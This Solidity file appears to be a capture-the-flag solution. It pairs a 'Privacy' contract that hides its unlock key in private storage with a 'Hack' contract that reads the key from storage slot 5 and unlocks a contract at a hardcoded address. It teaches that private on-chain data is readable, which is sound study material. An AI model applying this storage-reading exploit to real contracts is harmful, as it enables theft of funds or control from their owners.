// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}

contract Hack {
    // got key (i.e data[2]) using the command below:
    // await web3.eth.getStorageAt("0x994F5f5B9a0Ac9F23075c9B244022FfbD0811Ec1", 5)
    constructor(bytes32 key) {
        Privacy target = Privacy(0x994F5f5B9a0Ac9F23075c9B244022FfbD0811Ec1);
        target.unlock(bytes16(key));
    }
}
